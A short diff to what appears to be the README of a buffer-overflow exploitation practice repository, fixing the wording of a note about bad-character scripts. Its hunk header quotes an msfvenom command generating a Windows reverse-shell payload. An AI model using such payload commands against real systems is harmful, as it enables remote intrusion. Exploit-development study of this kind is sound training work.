@@ -24,6 +24,6 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<The-Listening-ip> LPORT=<Listening-
 
 # NOTE
 
-  *The badChars scripts present in each overflow contain a badChars variable from which also badchars specific to the overflow have been eliminated* 
+  *The badChars scripts present in each overflow directory contains a badChars variable from which also badchars specific to the overflow have been eliminated* 
   
 **Other Overflows will be added as I do them**
